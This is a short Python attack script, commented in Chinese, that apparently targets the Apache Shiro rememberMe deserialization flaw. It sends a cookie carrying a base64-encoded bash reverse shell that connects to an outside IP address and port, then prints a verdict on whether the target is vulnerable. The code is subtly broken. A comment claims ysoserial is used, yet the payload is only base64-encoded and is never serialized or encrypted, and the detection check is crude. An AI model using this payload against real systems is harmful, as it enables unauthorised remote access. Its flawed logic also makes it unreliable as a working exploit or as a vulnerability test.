import requests
import base64

# 生成恶意序列化数据，使用 ysoserial 工具
payload = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMy4yMTIvNTU5Nw==}|{base64,-d}|{bash,-i}"
payload_bytes = payload.encode('utf-8')
evil_data = base64.b64encode(payload_bytes).decode('utf-8')

# 构造 HTTP 请求头
headers = {
    'Cookie': 'rememberMe={}'.format(evil_data)
}

# 发送 GET 请求到目标网站
url = 'http://example.com/'
response = requests.get(url, headers=headers)

# 检测响应中是否存在漏洞
if 'rememberMe' in response.cookies:
    print('目标网站存在 Shiro 反序列化漏洞！')
else:
    print('目标网站不存在 Shiro 反序列化漏洞。')
